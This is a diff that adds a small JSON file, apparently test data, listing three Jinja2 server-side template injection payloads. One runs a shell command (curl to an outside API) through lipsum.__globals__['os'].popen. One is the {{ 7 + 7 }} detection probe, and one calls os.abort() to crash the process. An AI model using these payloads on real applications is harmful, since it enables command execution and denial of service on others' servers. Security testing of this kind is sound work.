@@ -1,0 +1,6 @@
+{
+  "project_name": "safe_default",
+  "ssti_payload1": "{{ lipsum.__globals__['os'].popen('curl -s https://api.restful-api.dev/objects').read() }}",
+  "ssti_payload2": "{{ 7 + 7 }}",
+  "ssti_payload3": "{{ lipsum.__globals__['os'].abort() }}"
+}
